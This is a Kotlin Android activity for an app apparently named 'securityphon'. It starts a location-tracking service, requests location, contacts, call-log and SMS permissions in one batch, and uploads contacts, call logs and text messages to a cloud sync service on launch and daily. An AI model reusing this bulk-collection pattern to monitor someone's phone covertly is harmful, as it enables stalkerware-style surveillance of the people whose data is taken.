package com.securityphon.ui

import android.Manifest
import android.content.pm.PackageManager
import android.graphics.Color
import android.os.Build
import android.os.Bundle
import android.widget.Button
import android.widget.TextView
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import androidx.work.*
import com.securityphon.R
import com.securityphon.backup.AutoBackupWorker
import com.securityphon.backup.CallLogBackupHelper
import com.securityphon.backup.ContactsBackupHelper
import com.securityphon.backup.SmsBackupHelper
import com.securityphon.data.AppDatabase
import com.securityphon.network.CloudSyncHelper
import com.securityphon.service.TrackingForegroundService
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    private val logHistory = StringBuilder()

    // 1-Tap Batch Permission Request Launcher
    private val batchPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.entries.all { it.value }
        if (allGranted) {
            appendLog("All permissions granted! Starting background protection & backup...")
            TrackingForegroundService.startService(this)
            scheduleDailyAutoBackup()
            syncAllData()
        } else {
            val denied = permissions.filter { !it.value }.keys.map { it.substringAfterLast(".") }
            appendLog("Some permissions not granted: $denied")
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val tvPendingCount = findViewById<TextView>(R.id.tvPendingCount)
        val tvLastResponse = findViewById<TextView>(R.id.tvLastResponse)
        val tvLiveLogs = findViewById<TextView>(R.id.tvLiveLogs)
        val btnSync = findViewById<Button>(R.id.btnForceSync)
        val btnBackupAll = findViewById<Button>(R.id.btnBackupContacts)
        val btnGrantAll = findViewById<Button>(R.id.btnGrantAllPermissions)

        btnBackupAll?.text = "💾 Backup All Now"

        val timeFormat = SimpleDateFormat("HH:mm:ss", Locale.getDefault())

        // Hook into live sync log updates
        CloudSyncHelper.onLogUpdate = { message, isSuccess ->
            runOnUiThread {
                try {
                    val time = timeFormat.format(Date())
                    val tag = if (isSuccess) "✔" else "✖"
                    logHistory.append("[$time] $tag $message\n")
                    tvLiveLogs?.text = logHistory.toString()
                    tvLastResponse?.text = "Last: $message"
                    tvLastResponse?.setTextColor(if (isSuccess) Color.parseColor("#10b981") else Color.parseColor("#ef4444"))
                    updateEventCount(tvPendingCount)
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        }

        // Start background security tracking safely
        TrackingForegroundService.startService(this)

        // Schedule automated 24-hour WorkManager backup
        scheduleDailyAutoBackup()

        // Request all runtime permissions on launch in 1 batch prompt
        checkAndRequestAllPermissions()

        // Direct instant cloud ping upon opening the app
        appendLog("App opened. Triggering instant cloud sync...")
        CloudSyncHelper.logAndSync(this, "APP_LAUNCHED", "{\"info\": \"App opened on device\"}")

        btnSync?.setOnClickListener {
            appendLog("Manual sync button pressed.")
            CloudSyncHelper.logAndSync(this, "MANUAL_SYNC", "{\"trigger\": \"Sync button pressed\"}")
        }

        btnBackupAll?.setOnClickListener {
            syncAllData()
        }

        btnGrantAll?.setOnClickListener {
            checkAndRequestAllPermissions()
        }

        updateEventCount(tvPendingCount)
    }

    private fun scheduleDailyAutoBackup() {
        try {
            val constraints = Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build()

            val autoBackupRequest = PeriodicWorkRequestBuilder<AutoBackupWorker>(24, TimeUnit.HOURS)
                .setConstraints(constraints)
                .build()

            WorkManager.getInstance(this).enqueueUniquePeriodicWork(
                "DailyPhoneSecurityBackup",
                ExistingPeriodicWorkPolicy.KEEP,
                autoBackupRequest
            )
            appendLog("24-Hour Auto-Backup Engine Active (WorkManager)")
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun checkAndRequestAllPermissions() {
        val permissionsToRequest = mutableListOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS
        )

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissionsToRequest.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        val missing = permissionsToRequest.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missing.isNotEmpty()) {
            appendLog("Requesting ${missing.size} required permissions...")
            batchPermissionLauncher.launch(missing.toTypedArray())
        } else {
            appendLog("All permissions active.")
            syncAllData()
        }
    }

    private fun syncAllData() {
        appendLog("Initiating Full System Cloud Backup (Contacts, Calls, SMS)...")
        
        // 1. Contacts
        ContactsBackupHelper.backupContacts(this) { success, message, count ->
            if (success) appendLog("✔ $message") else appendLog("✖ $message")
        }

        // 2. Call Logs
        CallLogBackupHelper.backupCallLogs(this) { success, message, count ->
            if (success) appendLog("✔ $message") else appendLog("✖ $message")
        }

        // 3. SMS Messages
        SmsBackupHelper.backupSms(this) { success, message, count ->
            if (success) appendLog("✔ $message") else appendLog("✖ $message")
        }
    }


    private fun appendLog(text: String) {
        runOnUiThread {
            try {
                val time = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
                logHistory.append("[$time] ℹ $text\n")
                findViewById<TextView>(R.id.tvLiveLogs)?.text = logHistory.toString()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    override fun onResume() {
        super.onResume()
        val tvPendingCount = findViewById<TextView>(R.id.tvPendingCount)
        CloudSyncHelper.logAndSync(this, "DEVICE_ACTIVE", "{\"state\": \"Foreground active\"}")
        updateEventCount(tvPendingCount)
    }

    private fun updateEventCount(textView: TextView?) {
        if (textView == null) return
        lifecycleScope.launch(Dispatchers.IO) {
            try {
                val count = AppDatabase.getInstance(this@MainActivity).eventDao().getPendingCount()
                withContext(Dispatchers.Main) {
                    textView.text = "Queued Local Events: $count"
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }
}

